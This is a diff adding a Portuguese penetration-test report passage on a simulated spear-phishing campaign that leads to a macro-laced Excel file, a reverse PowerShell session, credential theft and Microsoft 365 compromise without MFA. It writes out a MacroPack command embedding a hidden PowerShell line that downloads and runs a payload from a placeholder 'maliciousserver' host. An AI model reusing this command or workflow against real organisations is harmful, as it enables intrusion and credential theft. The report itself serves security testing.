@@ -1,0 +1,8 @@
+Durante o teste de engenharia social, foi conduzida uma campanha de phishing direcionado simulando um e-mail interno de atualização de documentos. O e-mail foi enviado a partir de um domínio controlado pelo analista, com layout idêntico ao da empresa, contendo um link hospedado em um serviço legítimo de armazenamento na nuvem (Google Drive).
+
+O link apontava para um documento do Office adulterado contendo uma macro maliciosa. A vítima, ao abrir o arquivo "Relatório_Financeiro_2025.xlsm", executou a macro ao permitir o conteúdo ativo. O arquivo havia sido preparado previamente com o uso da ferramenta MacroPack, utilizando o comando macropack.exe -t RAT -o Relatorio.xlsm -G -p "powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://maliciousserver/payload.ps1
+')".
+
+A execução da macro abriu uma conexão reversa com o servidor C2 do atacante, estabelecendo uma sessão remota via PowerShell. O atacante, então, coletou informações básicas do sistema executando systeminfo e hostname, além de capturar credenciais armazenadas no cache do navegador por meio de scripts adicionais.
+
+Foi identificado que a organização não utilizava MFA (autenticação multifator) para acesso a contas de e-mail, permitindo que o atacante reutilizasse as credenciais coletadas para comprometer o ambiente de Microsoft 365. A partir desse ponto, o acesso persistiu mesmo após a detecção inicial do phishing.
